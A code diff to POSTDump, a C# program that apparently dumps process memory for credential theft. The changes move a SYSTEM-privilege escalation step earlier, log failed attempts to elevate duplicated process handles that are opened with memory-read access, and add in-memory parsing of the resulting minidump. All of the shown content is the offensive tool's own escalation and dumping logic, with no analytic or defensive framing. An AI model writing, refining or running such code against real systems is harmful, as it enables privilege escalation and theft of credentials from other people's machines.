@@ -187,20 +187,22 @@ namespace POSTDump
             // Skip this part if driver technic used
             if (dc.hProcess == IntPtr.Zero)
             {
+                bool system = Handle.escalate_to_system();
+                if (!system)
+                {
+                    //Console.WriteLine("GetSystem failed!");
+                    Console.WriteLine("GetSystem failed!");
+                    return;
+                }
+
+                Console.WriteLine("Elevated to System");
+
                 if (Elevate)
                 {
                     if (!Handle.GetProcessHandle(pid, out procHandle, (uint)0x1000)) //PROCESS_QUERY_LIMITED_INFORMATION
                     {
                         //Console.WriteLine("Open process failed!2");
                         Console.WriteLine("Open process failed!");
-                        return;
-                    }
-
-                    bool system = Handle.escalate_to_system();
-                    if (!system)
-                    {
-                        //Console.WriteLine("GetSystem failed!");
-                        Console.WriteLine("GetSystem failed!");
                         return;
                     }
 
@@ -262,12 +264,6 @@ namespace POSTDump
                         return;
                     }
 
-                    if (!Handle.escalate_to_system())
-                    {
-                        Console.WriteLine("GetSystem failed!");
-                        return;
-                    }
-
                     desiredAccess = 0x1000 | 0x0010; //PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_READ
                     foreach (IntPtr hDuped in hDupHandles)
                     {
@@ -277,7 +273,12 @@ namespace POSTDump
                             Console.WriteLine("Elevate handle success.");
                             break;
                         }
+                        else
+                        {
+                            Console.WriteLine($"Elevate {hDuped.ToString("X")} duplicated handle failed.");
+                        }
                     }
+                    
                 }
 
                 if (!successTech)
@@ -297,7 +298,7 @@ namespace POSTDump
 
             if (!successDump)
             {
-                Console.WriteLine("Dump failed !");
+                Console.WriteLine("Got a handle but Dump failed !");
                 return;
             }
             else
@@ -307,6 +308,7 @@ namespace POSTDump
 
             if (Live)
             {
+                Console.WriteLine($"Parsing from memory..");
                 Minidump.Program.Main(dc.BaseAddress, dc.rva);
             }
             else
